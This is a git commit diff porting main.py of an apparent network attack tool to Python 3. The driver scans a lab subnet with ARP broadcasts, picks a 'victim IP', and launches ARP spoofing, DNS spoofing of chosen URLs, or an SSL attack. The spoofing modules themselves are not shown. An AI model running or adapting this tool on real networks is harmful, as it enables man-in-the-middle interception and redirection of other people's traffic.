e2867529f5de0fa47315b65bfb6b0e521fc94937
vorobyova1998 <alinavorobyova8@gmail.com>
2020-04-03 20:48:49 +0200

    interface for python 3

--- main.py
+++ main.py
@@ -15,48 +15,47 @@ def main():
     silentMode = None
     print("Start")
     while typeOfAttack != "arp" and typeOfAttack != "dns" and typeOfAttack != "ssl":
-        typeOfAttack = raw_input("Wrong mode of attack chose. Select arp/dns/ssl :")
+        typeOfAttack = input("Wrong mode of attack chose. Select arp/dns/ssl :")
 
     if typeOfAttack == "arp" or typeOfAttack == "dns":
 
-        modeOfAttack = raw_input("Do you want silent mode [y/n]:")
+        modeOfAttack = input("Do you want silent mode [y/n]:")
         while modeOfAttack != "y" and modeOfAttack != "n":
-            modeOfAttack = raw_input("Wrong input. Do you want silent mode [y/n]:")
+            modeOfAttack = input("Wrong input. Do you want silent mode [y/n]:")
 
         if modeOfAttack =="y":
             silentMode  = True
         if modeOfAttack == "n":
             silentMode  = False
 
-    networkInterface = raw_input("Enter network interface name (e.g. enp0s3) :")
+    networkInterface = input("Enter network interface name (e.g. enp0s3) :")
     print("Scanning the network .. ")
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0/24"), timeout=2, iface=networkInterface,
-                     inter=0.1, verbose = False)
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0/24"),timeout = 2, iface=networkInterface, verbose = False)
     for arg1, arg2 in ans:
         devicesListOnNetwork.update ({arg2[ARP].psrc : arg2[ARP].hwsrc})
         print("IP: {} MAC: {}".format(arg2[ARP].psrc, arg2[ARP].hwsrc))
 
-    input = ""
+    inputCmd = ""
 
-    while input not in devicesListOnNetwork.keys():
-        input = raw_input("Select victim IP from the network (e.f. 192.168.56.101): ")
-        if input in devicesListOnNetwork.keys():
-            victimIP.append(input)
+    while inputCmd not in devicesListOnNetwork.keys():
+        inputCmd = input("Select victim IP from the network (e.f. 192.168.56.101): ")
+        if inputCmd in devicesListOnNetwork.keys():
+            victimIP.append(inputCmd)
 
-    input = ""
+    inputCmd = ""
 
-    while input != "stop":
+    while inputCmd != "stop":
         if typeOfAttack == "arp":
-            input = raw_input("Select server (e.g. 192.168.56.102): ")
+            inputCmd = input("Select server (e.g. 192.168.56.102): ")
         elif typeOfAttack == "dns" or typeOfAttack == "ssl":
-            input = raw_input("Select server (e.g. 192.168.56.104): ")
+            inputCmd = input("Select server (e.g. 192.168.56.104): ")
         else :
             print ("Wrong mode of attack")
             sys.exit(0)
 
-        if input in devicesListOnNetwork.keys():
-            spoofIP.append(input)
-            input = raw_input("Add more server IP or type stop, if you are done:")
+        if inputCmd in devicesListOnNetwork.keys():
+            spoofIP.append(inputCmd)
+            inputCmd = input("Add more server IP or type stop, if you are done:")
         else :
             print("No IP on network")
 
@@ -72,10 +71,10 @@ def main():
         url = ""
         redirectTo = ""
         while url != "stop":
-            url = raw_input("Enter the URL to DNS spoof list or stop if you are done: ")
+            url = input("Enter the URL to DNS spoof list or stop if you are done: ")
 
             while redirectTo not in devicesListOnNetwork.keys():
-                redirectTo = raw_input("Enter sevrer IP where redirect request to (e.f. 192.168.56.102): ")
+                redirectTo = input("Enter sevrer IP where redirect request to (e.f. 192.168.56.102): ")
 
             url = url.upper()
             urlList.update({url + "": redirectTo})
@@ -91,7 +90,7 @@ def main():
 
 
     if typeOfAttack == "ssl":
-        port = raw_input("Enter port (e.g. 8050): ")
+        port = input("Enter port (e.g. 8050): ")
         sslAttack = httpResponse.Ssl(victimIP[0], port, networkInterface)
         sslAttack.start()
 
